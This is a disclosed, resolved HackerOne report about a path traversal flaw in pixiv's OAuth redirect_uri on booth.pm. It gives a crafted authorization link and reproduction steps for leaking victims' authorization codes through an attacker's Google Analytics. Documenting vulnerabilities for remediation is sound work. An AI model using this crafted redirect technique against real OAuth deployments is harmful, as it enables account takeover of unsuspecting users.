---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/improper-authorization
  - env/web
  - vuln/path-traversal
  - impact/account-takeover
  - trigger/auth-required
  - trigger/one-click
  - trigger/victim-interaction
substate: "resolved"
weakness: "Improper Authorization"
enriched: true
body: true
date: 2023-03-22
submitted: 2023-02-04T07:53:55.832Z
bounty_usd: 2000
votes: 253
cve: []
program: "[[programs/pixiv|pixiv]]"
reporter: "kuzu7shiki"
source: "https://hackerone.com/reports/1861974"
title: "Stealing Users OAuth authorization code via redirect_uri"
---
# Stealing Users OAuth authorization code via redirect_uri

> **Severity:** High | **Bounty:** 2,000 USD | **Votes:** 253 | **Program:** pixiv | **Disclosed:** 2023-03-22

- Report: [https://hackerone.com/reports/1861974](https://hackerone.com/reports/1861974)
- CWE: Improper Authorization
- Submitted: 2023-02-04T07:53:55.832Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

## Summary:
Path traversal in OAuth `redirect_uri` which can lead to users authorization code being leaked to any malicious user.

The following authorization code flow request is generated at booth login.
```
https://oauth.secure.pixiv.net/v2/auth/authorize?client_id=a1Z7w6JssUQkw5Hid0uIDeuesue9&redirect_uri=https%3A%2F%2Fbooth.pm%2Fusers%2Fauth%2Fpixiv%2Fcallback&response_type=code&scope=read-works+read-favorite-users+read-friends+read-profile+read-email+write-profile&state=%3A1a38b53563599621ce25094661b1c4458ddb52d79d771149
```

Path traversal vulnerability in this `redirect_uri` parameter allows the attacker to direct the user to the product page created by the attacker.
```
redirect_uri=https%3A%2F%2Fbooth.pm%2Fusers%2Fauth%2Fpixiv%2Fcallback/../../../../ja/items/4503924
```
-> redirected to https://booth.pm/ja/items/4503924

If the attacker had Google Analytics enabled, the query string could be exposed when the victim is redirected to the product page, so the unused authorization code is leaked.

## Steps To Reproduce:

  1. The attacker makes his shop public. Register his products and set up his Google Analytics tracking ID.
  2. Have the victim click on the following link; the value of the state parameter can be anything.
```
https://oauth.secure.pixiv.net/v2/auth/authorize?client_id=a1Z7w6JssUQkw5Hid0uIDeuesue9&redirect_uri=https%3A%2F%2Fbooth.pm%2Fusers%2Fauth%2Fpixiv%2Fcallback/../../../../ja/items/[attacker's product id]&response_type=code&scope=read-works+read-favorite-users+read-friends+read-profile+read-email+write-profile&state=%3A1a38b53563599621ce25094661b1c4458ddb52d79d771149
```

  3. When the victim clicks on the above link and proceeds with the login process, he is redirected to the attacker's product page.

  4. The attacker can steal victims' authorizaiton code from Google Analytics real-time reports.

## Impact

Due to path traversal in `redirect_uri` parameter in OAuth flow, its possible to redirect authenticated users to attacker's product page with their OAuth credentials from which its possible to takeover their account.

## Timeline

- **Report Filed**
- **Report Severity Updated**
- **Report Triaged**
- **2023-02-24** @kiridaruma: @kuzu7shiki 
Thanks for your report. And sorry for late reply.
I'm engineer of pixiv Inc.
We decided to set award to this report. However, we are investigating that how much the impact of this issue.
Please wait for us.

I'm sorry for late reply and thanks for your report.
Regards.
- **Bounty Awarded**
- **Report Severity Updated**
- **2023-02-25** @kuzu7shiki: @kiridaruma 
Thanks for your message and the bounty.
I'm glad to hear that the severity was reviewed.
Don't worry about late reply.

Thanks,
- **Report Retesting**
- **User Completed Retest**
- **Report Retest Approved**
- **Report Resolved**
- **Agreed On Going Public**
- **2023-03-20** @kuzu7shiki: @kiridaruma 
Can we disclose this report?
- **Agreed On Going Public**
- **Report Became Public**
